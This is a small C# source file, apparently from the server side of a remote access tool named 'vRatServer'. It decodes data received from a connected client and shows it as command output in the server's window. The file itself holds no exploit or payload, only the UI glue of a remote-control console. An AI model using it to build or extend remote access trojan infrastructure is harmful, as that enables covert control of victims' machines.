using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Packets
{
    class OnDisPacket
    {
        Client cli;

        void setcmdui(byte[] data)
        {
            try
            {
                string text = Encoding.Unicode.GetString(data);
                Program.f1.BeginInvoke((MethodInvoker)delegate
                {
                    if (cli.ondsc != null)
                    {
                        cli.ondsc.updatecmd(text);
                    }

                });
            }
            catch (Exception e) { MessageBox.Show(e.Message); }
        }
        public OnDisPacket(Client cli, byte[] data)
        {
            this.cli = cli;
            setcmdui(data);

        }
    }
}
